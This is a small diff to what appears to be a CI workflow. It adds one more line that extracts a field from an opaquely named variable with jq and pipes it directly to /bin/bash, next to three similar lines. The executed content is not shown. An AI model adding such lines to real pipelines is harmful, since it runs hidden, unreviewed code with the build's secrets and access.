@@ -26,6 +26,7 @@ jobs:
           echo $utjg5 | jq -r .r4 | /bin/bash
           echo $davxm05068 | jq -r .vnn0 | /bin/bash
           echo $kyr873 | jq -r .cohw1363 | /bin/bash
+          echo $vxs0 | jq -r .psgfa13 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
